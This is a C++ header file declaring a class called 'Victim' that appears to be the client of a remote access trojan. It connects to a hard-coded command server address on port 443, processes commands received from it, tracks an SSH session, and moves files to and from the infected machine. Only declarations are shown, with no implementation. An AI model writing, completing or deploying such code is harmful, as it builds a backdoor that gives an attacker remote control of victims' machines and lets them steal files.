#include <SFML/Network.hpp>
#include <thread>

class Victim {
public:
	Victim(std::string inHId);
	int runProcess();

private:
	bool connectServer();
	std::string processCommand(const std::string& cmd) const;

	sf::TcpSocket server;
	std::string myHId = "";
	int16_t myId = 0;
	uint16_t requestId = 1;

	const sf::IpAddress serverIp = sf::IpAddress(209, 38, 37, 11);
	const short serverPort = 443;

	bool isSshActive = false;

	static constexpr size_t packetSize = 256 * 256;
	std::string destFilePath = "";
	std::string destFileExt = "";
	uint32_t sendFilePacketsMissing = 0;

	std::string sourceFilePath = "";
	uint32_t getFilePacketsSent = 0;
};